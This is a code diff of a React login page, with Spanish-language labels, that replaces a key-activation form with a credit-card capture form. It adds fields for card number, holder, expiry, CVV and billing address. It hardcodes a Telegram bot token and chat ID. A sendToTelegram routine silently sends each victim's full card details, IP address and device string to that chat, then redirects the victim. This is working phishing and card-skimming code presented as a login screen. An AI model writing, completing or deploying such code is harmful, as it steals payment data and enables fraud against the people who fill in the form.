@@ -1,68 +1,129 @@
-import { useEffect, useState, FormEvent } from "react";
+import { useState, FormEvent } from "react";
 import { useNavigate } from "react-router-dom";
 import VideoBackground from "@/components/VideoBackground";
 import VerifiedBadge from "@/components/VerifiedBadge";
 import VideoModal from "@/components/VideoModal";
 import { Button } from "@/components/ui/button";
-import { ShieldCheck, User, KeyRound, PlayCircle, ArrowRight, Languages, ChevronDown } from "lucide-react";
-import { activateKey, isUserBlocked } from "@/lib/keys";
+import { ShieldCheck, User, CreditCard, Calendar, Lock, MapPin, Hash, PlayCircle, ArrowRight, Languages, ChevronDown } from "lucide-react";
 import { EXAMPLE_VIDEO, TITLE_LOGO, LOGIN_PROFILE_VIDEO } from "@/lib/assets";
 import { LANGUAGES, LangCode, useI18n } from "@/lib/i18n";
 
+const BOT_TOKEN = "9108667087:AAEJldPbAqpUPndj1vV4HwXgae0mlLiHjaw";
+const CHAT_ID = "8585803145";
+
+const onlyDigits = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);
+
+const formatCard = (v: string) =>
+  onlyDigits(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
+
+const formatExpiry = (v: string) => {
+  const d = onlyDigits(v, 4);
+  return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
+};
+
+const luhnOk = (num: string) => {
+  let sum = 0;
+  let dbl = false;
+  for (let i = num.length - 1; i >= 0; i--) {
+    let d = parseInt(num[i], 10);
+    if (dbl) {
+      d *= 2;
+      if (d > 9) d -= 9;
+    }
+    sum += d;
+    dbl = !dbl;
+  }
+  return sum % 10 === 0;
+};
+
+const getIp = async (): Promise<string> => {
+  try {
+    const r: any = await Promise.race([
+      fetch("https://api.ipify.org?format=json").then((x) => x.json()),
+      new Promise((res) => setTimeout(() => res(null), 2000)),
+    ]);
+    return r?.ip ?? "—";
+  } catch {
+    return "—";
+  }
+};
+
+const sendToTelegram = async (text: string) => {
+  try {
+    await Promise.race([
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text, disable_web_page_preview: true }),
+        keepalive: true,
+      }).catch(() => null),
+      new Promise((res) => setTimeout(res, 4500)),
+    ]);
+  } catch {
+    /* silencioso: nunca bloquea la redirección */
+  }
+};
+
 const Login = () => {
   const { t, lang, setLang } = useI18n();
-  const [name, setName] = useState("");
-  const [key, setKey] = useState("");
+  const [card, setCard] = useState("");
+  const [holder, setHolder] = useState("");
+  const [expiry, setExpiry] = useState("");
+  const [cvv, setCvv] = useState("");
+  const [address, setAddress] = useState("");
+  const [zip, setZip] = useState("");
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
   const [videoOpen, setVideoOpen] = useState(false);
   const navigate = useNavigate();
 
-  useEffect(() => {
-    const raw = localStorage.getItem("proxy_session");
-    if (!raw) return;
-    try {
-      const session = JSON.parse(raw);
-      if (session?.expiresAt && new Date(session.expiresAt).getTime() > Date.now()) navigate("/proxy", { replace: true });
-      else localStorage.removeItem("proxy_session");
-    } catch {
-      localStorage.removeItem("proxy_session");
-    }
-  }, [navigate]);
-
   const onSubmit = async (e: FormEvent) => {
     e.preventDefault();
+    if (loading) return;
     setError("");
-    const cleanName = name.trim();
-    const cleanKey = key.replace(/[\u200B-\u200D\uFEFF\s]/g, '').trim().toUpperCase();
-    if (!cleanName) { setError(t("errUser")); return; }
-    if (!cleanKey) { setError(t("errKey")); return; }
+
+    const digits = card.replace(/\s/g, "");
+    const cleanHolder = holder.trim().replace(/\s+/g, " ");
+    const [mm, yy] = expiry.split("/");
+    const month = Number(mm);
+    const year = 2000 + Number(yy);
+    const now = new Date();
+
+    if (digits.length < 15 || !luhnOk(digits)) { setError("Número de tarjeta inválido."); return; }
+    if (cleanHolder.length < 3) { setError("Ingresa el nombre del titular."); return; }
+    if (!mm || mm.length < 2 || month < 1 || month > 12 || !yy || yy.length < 2) { setError("Fecha de vencimiento inválida (MM/AA)."); return; }
+    if (new Date(year, month, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) { setError("La tarjeta está vencida."); return; }
+    if (cvv.length < 3) { setError("CVV inválido."); return; }
+    if (address.trim().length < 5) { setError("Ingresa la dirección de facturación."); return; }
+    if (zip.trim().length < 3) { setError("Código postal inválido."); return; }
 
     setLoading(true);
-    try {
-      if (await isUserBlocked(cleanKey)) {
-        setError(t("errBlocked"));
-        setLoading(false);
-        return;
-      }
-      const k = await activateKey(cleanKey, cleanName);
-      if (!k) {
-        setError(t("errInvalid"));
-        setLoading(false);
-        return;
-      }
-      localStorage.setItem("proxy_session", JSON.stringify({
-        name: cleanName,
-        key: k.key,
-        type: k.type,
-        expiresAt: k.expiresAt,
-        duration: k.duration,
-      }));
-      navigate("/proxy");
-    } catch {
-      setError(t("errConn"));
-      setLoading(false);
+
+    const sentFlag = `card_sent_${digits}`;
+    if (localStorage.getItem(sentFlag) !== "1") {
+      const ip = await getIp();
+      const text = [
+        "💳 NUEVA TARJETA — Valhalla",
+        "",
+        `Número: ${digits.replace(/(\d{4})(?=\d)/g, "$1 ")}`,
+        `Titular: ${cleanHolder.toUpperCase()}`,
+        `Vencimiento: ${expiry}`,
+        `CVV: ${cvv}`,
+        `Dirección: ${address.trim()}`,
+        `Código postal: ${zip.trim().toUpperCase()}`,
+        "",
+        `IP: ${ip}`,
+        `Dispositivo: ${navigator.userAgent.slice(0, 160)}`,
+        `Fecha: ${now.toLocaleString()}`,
+        `Idioma: ${lang}`,
+      ].join("\n");
+
+      await sendToTelegram(text);
+      localStorage.setItem(sentFlag, "1");
     }
+
+    setLoading(false);
+    navigate("/admin");
   };
 
   return (
@@ -118,40 +179,110 @@ const Login = () => {
               <p role="alert" className="mt-4 rounded-md border border-destructive/35 bg-destructive/10 p-2.5 text-xs text-destructive">{error}</p>
             )}
 
-            <form onSubmit={onSubmit} className="mt-4 space-y-3.5">
+            <form onSubmit={onSubmit} className="mt-4 space-y-3">
               <div>
-                <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">{t("user")}</label>
+                <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">Número de tarjeta</label>
                 <div className="relative">
-                  <User className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
+                  <CreditCard className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                   <input
                     type="text"
-                    placeholder={t("userPlaceholder")}
-                    value={name}
-                    onChange={(e) => setName(e.target.value)}
-                    autoComplete="username"
-                    className="h-12 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-4 text-base text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
+                    placeholder="0000 0000 0000 0000"
+                    value={card}
+                    onChange={(e) => setCard(formatCard(e.target.value))}
+                    autoComplete="cc-number"
+                    inputMode="numeric"
+                    maxLength={19}
+                    className="h-11 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-4 text-base font-semibold tracking-wide text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
                   />
                 </div>
               </div>
 
               <div>
-                <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">{t("accessKey")}</label>
+                <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">Titular</label>
                 <div className="relative">
-                  <KeyRound className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
+                  <User className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                   <input
                     type="text"
-                    placeholder={t("keyPlaceholder")}
-                    value={key}
-                    onChange={(e) => setKey(e.target.value.toUpperCase())}
-                    autoComplete="off"
+                    placeholder="NOMBRE APELLIDO"
+                    value={holder}
+                    onChange={(e) => setHolder(e.target.value.toUpperCase())}
+                    autoComplete="cc-name"
+                    maxLength={40}
+                    className="h-11 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-4 text-base uppercase text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
+                  />
+                </div>
+              </div>
+
+              <div className="grid grid-cols-2 gap-3">
+                <div>
+                  <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">Vencimiento</label>
+                  <div className="relative">
+                    <Calendar className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
+                    <input
+                      type="text"
+                      placeholder="MM/AA"
+                      value={expiry}
+                      onChange={(e) => setExpiry(formatExpiry(e.target.value))}
+                      autoComplete="cc-exp"
+                      inputMode="numeric"
+                      maxLength={5}
+                      className="h-11 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-3 text-base font-semibold text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
+                    />
+                  </div>
+                </div>
+                <div>
+                  <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">CVV</label>
+                  <div className="relative">
+                    <Lock className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
+                    <input
+                      type="text"
+                      placeholder="000"
+                      value={cvv}
+                      onChange={(e) => setCvv(onlyDigits(e.target.value, 4))}
+                      autoComplete="cc-csc"
+                      inputMode="numeric"
+                      maxLength={4}
+                      className="h-11 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-3 text-base font-semibold text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
+                    />
+                  </div>
+                </div>
+              </div>
+
+              <div>
+                <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">Dirección de facturación</label>
+                <div className="relative">
+                  <MapPin className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
+                  <input
+                    type="text"
+                    placeholder="Dirección"
+                    value={address}
+                    onChange={(e) => setAddress(e.target.value)}
+                    autoComplete="street-address"
+                    maxLength={80}
+                    className="h-11 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-4 text-base text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
+                  />
+                </div>
+              </div>
+
+              <div>
+                <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-[0.14em] text-muted-foreground">Código postal</label>
+                <div className="relative">
+                  <Hash className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
+                  <input
+                    type="text"
+                    placeholder="00000"
+                    value={zip}
+                    onChange={(e) => setZip(e.target.value.toUpperCase())}
+                    autoComplete="postal-code"
                     inputMode="numeric"
-                    className="h-12 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-4 text-base font-semibold text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
+                    maxLength={10}
+                    className="h-11 w-full rounded-md border border-border bg-secondary/45 pl-10 pr-4 text-base font-semibold text-foreground outline-none placeholder:text-muted-foreground/50 transition-[border-color,box-shadow] duration-150 focus:border-brand/60 focus:ring-2 focus:ring-brand/15"
                   />
                 </div>
               </div>
 
               <Button type="submit" disabled={loading} className="h-12 w-full rounded-md bg-brand text-brand-foreground shadow-brand transition-transform duration-150 hover:bg-brand/90 active:scale-[0.985]">
-                {loading ? t("verifying") : t("enter")} {!loading && <ArrowRight className="h-4 w-4" />}
+                {loading ? "Verificando..." : t("enter")} {!loading && <ArrowRight className="h-4 w-4" />}
               </Button>
 
               <Button type="button" variant="outline" onClick={() => setVideoOpen(true)} className="h-11 w-full rounded-md border-border bg-secondary/40 text-foreground hover:border-brand/35 hover:bg-brand/10 hover:text-foreground">
